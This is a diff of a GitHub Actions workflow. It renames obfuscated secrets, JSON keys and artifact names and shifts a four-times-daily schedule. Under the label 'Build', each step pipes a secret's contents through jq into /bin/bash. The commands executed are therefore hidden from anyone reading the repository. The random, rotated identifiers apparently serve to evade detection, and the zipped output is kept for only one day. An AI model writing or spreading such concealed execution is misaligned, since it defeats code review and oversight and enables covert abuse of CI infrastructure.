@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '24 5,11,17,23 * * *'
+    - cron: '7 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -16,18 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Build
         env:
-          ypyyx25: ${{ secrets.ypyyx25 }}
+          zk92321: ${{ secrets.zk92321 }}
         run: |
-          printf '%s' "$ypyyx25" | jq -r .qceps98 | /bin/bash
-          printf '%s' "$dsu37" | jq -r .lfdz8515 | /bin/bash
-          echo $a694 | jq -r .brr21 | /bin/bash
-          printf '%s' "$xzeh6" | jq -r .wq10 | /bin/bash
-          echo $wby5662 | jq -r .x156 | /bin/bash
-          printf '%s' "$jgoi3" | jq -r .h96085 | /bin/bash
+          printf '%s' "$zk92321" | jq -r .xftdw92977 | /bin/bash
+          echo $wqnc4 | jq -r .db8 | /bin/bash
+          printf '%s' "$surp3" | jq -r .f253 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: q3BMZdLB
+          name: 9zPCUmIq
           path: "*.zip"
           retention-days: 1
